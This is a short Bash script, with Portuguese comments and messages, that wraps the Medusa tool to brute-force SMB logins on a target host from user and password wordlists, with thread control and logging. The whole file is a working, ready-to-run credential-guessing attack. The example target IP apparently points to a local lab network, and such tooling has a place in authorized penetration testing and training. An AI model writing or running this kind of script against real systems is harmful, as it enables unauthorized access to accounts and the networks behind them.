#!/usr/bin/env bash
#
# smb_protocol.sh - Ataque de força bruta SMB usando Medusa
#

set -euo pipefail

TARGET=""
USERLIST=""
PASSLIST=""
THREADS=6
OUTPUT_FILE=""

usage() {
  cat <<EOF
Uso: $0 -t <TARGET> -U <userlist> -P <passlist> [opções]

Obrigatórios:
  -t <TARGET>      IP ou hostname do alvo (ex: 192.168.56.101)
  -U <userlist>    Arquivo com lista de usuários (ex: users.txt)
  -P <passlist>    Arquivo com lista de senhas (ex: pass.txt)

Opcionais:
  -T <threads>     Número de threads do Medusa (padrão: 6)
  -o <arquivo>     Arquivo de saída para salvar o resultado
  -h               Mostrar esta ajuda

Exemplo:
  $0 -t 192.168.56.101 -U users.txt -P pass.txt
EOF
}

# Verifica dependências
check_deps() {
  if ! command -v medusa >/dev/null 2>&1; then
    echo "[ERRO] medusa não encontrado no PATH. Instale o medusa antes de usar este script."
    exit 1
  fi
}

# Parse de parâmetros
while getopts ":t:U:P:T:o:h" opt; do
  case "$opt" in
    t) TARGET="$OPTARG" ;;
    U) USERLIST="$OPTARG" ;;
    P) PASSLIST="$OPTARG" ;;
    T) THREADS="$OPTARG" ;;
    o) OUTPUT_FILE="$OPTARG" ;;
    h)
      usage
      exit 0
      ;;
    \?)
      echo "[ERRO] Opção inválida: -$OPTARG"
      usage
      exit 1
      ;;
    :)
      echo "[ERRO] A opção -$OPTARG requer um valor."
      usage
      exit 1
      ;;
  esac
done

# Validação básica
if [[ -z "$TARGET" || -z "$USERLIST" || -z "$PASSLIST" ]]; then
  echo "[ERRO] TARGET, userlist e passlist são obrigatórios."
  usage
  exit 1
fi

if [[ ! -f "$USERLIST" ]]; then
  echo "[ERRO] Arquivo de usuários não encontrado: $USERLIST"
  exit 1
fi

if [[ ! -f "$PASSLIST" ]]; then
  echo "[ERRO] Arquivo de senhas não encontrado: $PASSLIST"
  exit 1
fi

check_deps

# Se não foi passado -o, cria um padrão
if [[ -z "${OUTPUT_FILE}" ]]; then
  mkdir -p logs
  OUTPUT_FILE="logs/smb_medusa_$(date +%Y%m%d_%H%M%S).log"
fi

echo "[*] Iniciando ataque SMB com Medusa..."
echo "    Alvo      : $TARGET"
echo "    Users     : $USERLIST"
echo "    Senhas    : $PASSLIST"
echo "    Threads   : $THREADS"
echo "    Output    : $OUTPUT_FILE"
echo

# Comando principal (o que você me passou, com threads e log)
medusa -h "$TARGET" -U "$USERLIST" -P "$PASSLIST" -M SMB -t "$THREADS" | tee "$OUTPUT_FILE"

echo
echo "[*] Ataque SMB finalizado. Resultados em: $OUTPUT_FILE"
